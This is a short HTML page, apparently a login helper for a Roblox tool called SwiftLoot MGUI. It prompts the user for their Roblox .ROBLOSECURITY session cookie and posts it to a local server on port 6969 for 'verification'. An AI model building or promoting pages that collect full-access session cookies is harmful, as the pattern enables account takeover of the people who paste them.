<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SwiftLoot MGUI Auto Login</title>
</head>
<body>
<script>
// Replace these values with actual Roblox user input
let robloCookie = prompt("Enter Roblox .ROBLOSECURITY:");
let placeId = 0; // Optional: replace with actual PlaceId
let jobId = ""; // Optional: replace with actual JobId

fetch("http://127.0.0.1:6969/verify", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        cookie: robloCookie,
        placeId: placeId,
        jobId: jobId
    })
})
.then(res => res.json())
.then(data => alert("Verification sent! Success: " + data.valid))
.catch(err => console.error(err));
</script>
</body>
</html>
